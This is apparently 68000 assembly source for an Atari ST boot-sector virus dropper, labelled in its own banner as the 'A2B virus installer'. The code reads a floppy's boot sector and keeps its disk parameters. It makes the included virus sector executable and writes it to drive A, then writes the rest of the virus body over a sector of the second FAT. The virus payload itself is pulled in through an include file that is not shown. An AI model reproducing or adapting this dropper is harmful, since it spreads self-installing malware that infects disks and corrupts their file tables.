print           EQU 9
gemdos          EQU 1
s_len		EQU -1

; future update:
; i wanna re-write this dropper to use BOOT.INC and MEM.INC


; init program

    go:   move.l sp,a5
       	  lea x666_stackend,sp

    ; calculate program and data size for TOS - to free unused space
       movea.l 4(a5),a5   ; a5 points 100bytes below program start
       move.l $c(a5),d0
       add.l $14(a5),d0
       add.l $1c(a5),d0
       add.l #$100,d0
       move.l d0,-(sp)
       move.l a5,-(sp)
       move.w #0,-(sp)
       move.w #$4a,-(sp)
       trap #gemdos      ; SETBLOCK Gemdos
       add.l #12,sp      ; correct stack
       tst.l d0
       bne x666_exit      ; error occured? -> go to error

;; main entry ;;

_x666_main:

    ; print x666_banner...
       pea x666_banner
       move.w #9,-(sp)
       trap #gemdos
       addq.l #6,sp

    ; wait for keypress 'w', 'q' or 'f'
    x666_press_w:
       move.w #8,-(sp)
       trap #gemdos
       addq.l #2,sp
       
      ; w pressed? - then write the bootblock...
       cmpi #'w',d0
       beq x666_infect_disk
       cmpi #'W',d0
       beq x666_infect_disk
       ; Q pressed? - then terminate program...
       cmpi #'q',d0
       beq x666_term_vinstall
       cmpi #'Q',d0
       beq x666_term_vinstall
       cmpi #'t',d0
       beq x666_t_testboot
       cmpi #'T',d0
       beq x666_t_testboot       
       ; neither w nor q? - then get another keypress   
       bra x666_press_w

x666_t_testboot:
 ; run bootsector routine in supervisor   
       pea	_your_bs_start
       move.w	#$26,-(sp)
       trap	#14
       addq.l	#6,sp
       
       ; wait for a key
       move.w	#8,-(sp)
       trap	#1
       addq.l	#2,sp
       jmp	_x666_main
       
x666_infect_disk:
	x666_make_buff:
		lea.l	 x666_v_buff(pc),a0
		lea.l	 x666_s_buff(pc),a1
		move.l	 a0,(a1)

	x666_read_victim:	
		move.w   #$1,-(sp)	; read 1 sector
		move.w   #$0,-(sp)	; side 0
		move.w   #$0,-(sp)	; track 0
		move.w   #$1,-(sp)	; bootsector
		move.w   #$0,-(sp)	; drive A:
		move.l   #$0,-(sp)	; never used
		lea.l	 x666_s_buff(pc),a0
		move.l	 (a0),-(sp)
		move.w   #$08,-(sp)
		trap   #14
		lea   20(sp),sp	
	
	x666_save_victim_bpb:
		move.l	x666_s_buff(pc),d0
		move.l	d0,a0
		addq	#$2,a0
		move.l	#$1A,d0
		lea.l	_your_bs_start+2(pc),a1

		_x666_cpylp:
			move.b (a0)+,(a1)+
			dbf	d0,_x666_cpylp

	x666_make_exec:
		move.w   #$1,-(sp)		; executable
		move.w   #-1,-(sp)		; type don't change
		move.l   #-1,-(sp)		; serial don't change
		lea.l	 _your_bs_start(pc),a0
		move.l	 a0,-(sp)
		move.w   #$12,-(sp)
		trap	 #14
		lea	 14(sp),sp
	
	x666_plant_virus:
		move.w   #$1,-(sp)	; read 1 sector
		move.w   #$0,-(sp)	; side 0
		move.w   #$0,-(sp)	; track 0
		move.w   #$1,-(sp)	; bootsector
		move.w   #$0,-(sp)	; drive A:
		move.l   #$0,-(sp)	; never used
		lea.l	 _your_bs_start(pc),a0
		move.l	 a0,-(sp)
		move.w   #$09,-(sp)
		trap	 #14
		lea	 20(sp),sp


	x666_plant_rest_of_virus:
		lea.l	_your_bs_start+$200(pc),a0
		clr.w	d0		; floppy A:
		move.w	#$09,d5		; flopwr()
		bsr	x666_rw_more_code
		

	x666_exit:
		bra x666_term_vinstall

x666_err_mem_low:
		pea x666_err_mem_low_msg
       		move.w #9,-(sp)
       		trap #gemdos
       		addq.l #6,sp


		bra x666_exit
		
;; both disk io routines were not INCLUDEd due to my usage of
;; x666 prefix for all labels. this way any virus INCLUDEd
;; won't have clashing labels


; ==========================================================
;
; READ/WRITE MORE SECTORS
;
; this routine overwrites 2nd FAT.
; max size of extra virus body: 5*$200
;
; INPUT:
; A0.l = &(buffer) for extra virus body
; D0.l = drive A: or B:
; D5.w = read ($08) or write ($09)
;
; OUTPUT:
; D0.l = success or failure
;
; ==========================================================


x666_rw_more_code:
	movem.l	d1-d7/a0-a6,-(a7)
	; a0 = &(buffer)
	; d0 = dev #
	move.w #1,d1	; one sector
	move.w #0,d2	; side 0
	move.w #0,d3	; track 0
	move.w #6,d4	; sector 6
	; d5 = read/write op
	bsr x666_flop_io_EX
	movem.l	(a7)+,d1-d7/a0-a6
	rts
END_x666_rw_more_code:	

		
; ==========================================================
;     EXTENDED FLOPPY IO
;
; allows access to any CHS on the disk
;
; INPUTS:
; A0.l = &(buffer) will hold extra code
; D0.w = drive A: or B:
; D1.w = num sectors
; D2.w = side
; D3.w = track
; D4.w = sector
; D5.w = read/write ($08) or ($09)
;
; OUTPUT:
; D0 = success or failure
;
; end of bootsector: $1FD
;
; ==========================================================

x666_flop_io_EX:
	movem.l	d1-d7/a0-a6,-(a7)
        move.w	 d1,-(sp)	; num sectors
	move.w   d2,-(sp)	; side 0 or 1
	move.w   d3,-(sp)	; track #
	move.w   d4,-(sp)	; sector
	move.w   d0,-(sp)	; drive A: or B:
	clr.l       -(sp)	; never used
	move.l	 a0,-(sp)	; buffer
	move.w   d5,-(sp)	; floprd() ($08) OR flopwr() ($09)
	trap   #14
	lea   20(sp),sp
	movem.l	(a7)+,d1-d7/a0-a6
	rts
END_x666_flop_io_EX:
	

        EVEN
        
x666_term_vinstall:
	clr.l	-(a7) ; pterm()
	trap	#1
        
; storage
	x666_s_buff:	dc.l	0
	x666_v_buff:	dcb.b	$200,0
			dcb.b	$200,0

x666_err_mem_low_msg: dc.b "Not enough free memory.",0

   ; stack
x666_stkstart:    ds.l	256
x666_stackend:    ds.l	1   


x666_save_last2:
		  dc.w	0

x666_banner:
	dc.b "----------------------",13,10
	dc.b " A2B virus installer ",13,10
	dc.b "----------------------",13,10
	dc.b "Please insert your disk in drive A and",13,10
	dc.b "press 'w' to infect victim bootsector",13,10
	dc.b "press 't' to test bootsector",13,10
	dc.b "REMOVE WRITE PROTECTION TAB!",13,10,13,10,13,10
        dc.b "Press 'q' to return to the desktop.",13,10,0


; ======== YOUR BOOTSECTOR HERE =================
	EVEN
_your_bs_start:
	INCLUDE a2b.s
	padding: dcb.b $200,0
_your_bs_end:
; ===============================================